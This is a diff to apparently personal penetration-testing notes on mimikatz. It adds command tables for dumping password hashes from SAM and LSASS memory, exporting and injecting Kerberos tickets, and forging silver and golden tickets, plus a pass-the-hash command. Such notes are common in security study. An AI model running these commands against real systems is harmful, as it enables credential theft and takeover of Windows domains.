@@ -12,7 +12,7 @@ Extracts password, hashes, etc. from various sources on windows:
 - SAM
 - Memory of the LSASS
 
-For fundamentals see [[2 Tech-Specifics/OS/Windows/Authentication Attacks Windows|Authentication Attacks Windows]]
+For fundamentals see [[2 Tech-Specifics/OS/Windows/Credential Access/Local Credential Access|Windows Local Credential Access]]
 
 Good reference guide: [adsecurity](https://adsecurity.org/?page_id=1821)
 
@@ -37,30 +37,49 @@ e.g. `crypto::certificates /systemstore:local_machine`
 
 Available modules: <https://github.com/gentilkiwi/mimikatz/wiki#modules>
 
-**Common commands:**
+## Common commands:
 
-| Command                                        | Purpose                                                                                           |
-| ---------------------------------------------- | ------------------------------------------------------------------------------------------------- |
-| `log <path>`                                   | write output to file                                                                              |
-| `privilege::debug`                             | enable debugging privileges                                                                       |
-| `token::elevate`                               | elevate privileges                                                                                |
-| `lsadump::sam`                                 | dump credentials form SAM                                                                         |
-| `sekurlsa::logonpasswords`                     | dump cached passwords                                                                             |
-| `sekurlsa::tickets`                            | dump cached [[2 Tech-Specifics/OS/Windows/Fundamentals - Windows#Kerberos\|Kerberos Tickets]]     |
-| `crypto::capi`<br>or `crypto::cng`             | make non-exportable private keys from certificates exportable                                     |
-| `kerberos::golden`                             | see [[#Forging Kerberos Tickets]]                                                                 |
-| `lsadump::dcsync /user:<domain>\<target_user>` | perform [[2 Tech-Specifics/Active Directory/Authentication Attacks/dcsync Attack\|dcsync Attack]] |
+| Command                                        | Purpose                                                                                     |
+| ---------------------------------------------- | ------------------------------------------------------------------------------------------- |
+| `log <path>`                                   | write output to file                                                                        |
+| `privilege::debug`                             | enable debugging privileges                                                                 |
+| `token::elevate`                               | elevate privileges                                                                          |
+| `misc::cmd`                                    | launch new cmd instance with current context                                                |
+| `crypto::capi`<br>or `crypto::cng`             | make non-exportable private keys from certificates exportable                               |
+| `lsadump::dcsync /user:<domain>\<target_user>` | perform [[2 Tech-Specifics/Active Directory/Lateral Movement/dcsync Attack\|dcsync Attack]] |
+
+## Extract password hashes
+
+| Command                    | Purpose                                                                                                                    |
+| -------------------------- | -------------------------------------------------------------------------------------------------------------------------- |
+| `lsadump::sam`             | dump credentials of local accounts from [[2 Tech-Specifics/OS/Windows/Fundamentals - Windows#SAM\|SAM]]                    |
+| `sekurlsa::logonpasswords` | extract cached domain passwords from [[2 Tech-Specifics/OS/Windows/Fundamentals - Windows#LSASS\|LSASS Memory]]            |
+| `lsadump::lsa /patch`      | patch the [[2 Tech-Specifics/OS/Windows/Fundamentals - Windows#LSASS\|LSASS Process]] to extract more critical credentials |
+
+## Work with Kerberos Tickets
+
+| Command                    | Purpose                                                                                                                                       |
+| -------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------- |
+| `sekurlsa::tickets`        | dump cached [[2 Tech-Specifics/OS/Windows/Fundamentals - Windows#Kerberos\|Kerberos Tickets]]<br>use `/export` to export the tickets to files |
+| `kerberos::golden`         | see [[#Forging Kerberos Tickets]]                                                                                                             |
+| `kerberos::ptt <tgs_file>` | inject a Kerberos TGS into the present cache                                                                                                  |
+| `kerberos::purge`          | delete all cached kerberos tickets                                                                                                            |
 
 # Snippets
 
 ## Forging Kerberos Tickets
 
+> [!Hint] Privileges of forged tickets
+> When forging tickets, mimikatz sets the group memberships to high privileged groups (domain admins, local admins) per default. - The group [[2 Tech-Specifics/OS/Windows/Fundamentals - Windows#SIDs|RIDs]] are shown in the output.
+
+### Silver Tickets
+
 See [[2 Tech-Specifics/Network/Protocols/TCP,UDP 88 Kerberos#Silver Tickets|Kerberos - Forging Silver Tickets]]
 
-The following pieces of information are needed for the attack:
+**Required information:**
 
-- password hash of the target service account
-	- see [[2 Tech-Specifics/OS/Windows/Authentication Attacks Windows|Authentication Attacks Windows]]
+- NTLM password hash of the target service account
+	- see [[2 Tech-Specifics/OS/Windows/Credential Access/Overview - Credential Access|Windows  Credential Access]]
 - Domain SID
 	- use `whoami /user` and only use the [[2 Tech-Specifics/OS/Windows/Fundamentals - Windows#SIDs|Domain SID]]
 - SPN of the target service
@@ -68,17 +87,46 @@ The following pieces of information are needed for the attack:
 
 **Workflow:**
 
-1. Use the `kerberos::golden` command like this:
+1. Create a silver ticket with `kerberos::golden`:
 
-```powershell
+```
 kerberos::golden /sid:<domain_SID> /domain:<domain_name> /ptt /target:<SPN> /service:<protocol> /rc4:<ntlm_hash> /user:<username>
 ```
 
-- `/ptt` tells mimikatz to add the created ticket to the local cache
+- `/ptt` tells mimikatz to inject created ticket to the local cache
 - `/service:<protocol>` - e.g. `http`, `smb`
 - `/user` can be set to any existing domain user
 
 2. use `klist` to verify that the ticket is present
 
-**Hints:**
-- The Group ID section in mimikatz output shows the groups RIDs set in the ticket (usually local admins, domain admins)
+### Golden Tickets
+
+See [[2 Tech-Specifics/Network/Protocols/TCP,UDP 88 Kerberos#Golden Tickets|Kerberos - Forging Golden Tickets]]
+
+**Required information:**
+- NTLM password hash of the `krbtgt` account
+- Domain SID
+	- use `whoami /user` and only use the [[2 Tech-Specifics/OS/Windows/Fundamentals - Windows#SIDs|Domain SID]]
+
+**Workflow:**
+1. Create a golden ticket with `kerberos::golden`:
+
+```
+kerberos::golden /user:<user> /domain:<domain_name> /sid:<domain_sid> /krbtgt:<ntlm_hash> /ptt
+```
+
+- `/ptt` tells mimikatz to inject created ticket to the local cache
+- `/user` can be set to any existing domain user
+2. use `klist` to verify that the ticket is present
+
+## Spawn Process with cached Credentials
+
+**Purpose:**
+- [[2 Tech-Specifics/Active Directory/Credential Access/Overpass the Hash|Overpass the Hash]]
+- [[2 Tech-Specifics/OS/Windows/Privilege Escalation - Windows/Overview - Privilege Escalation - Windows|Windows Privilege Escalation]]?
+
+```
+sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<ntlm_hash> /run:<command>
+```
+
+E.g. run `powershell` as command. Note: When running `whoami` from the new powershell process, it will still show the "old" user you started the escalation from.
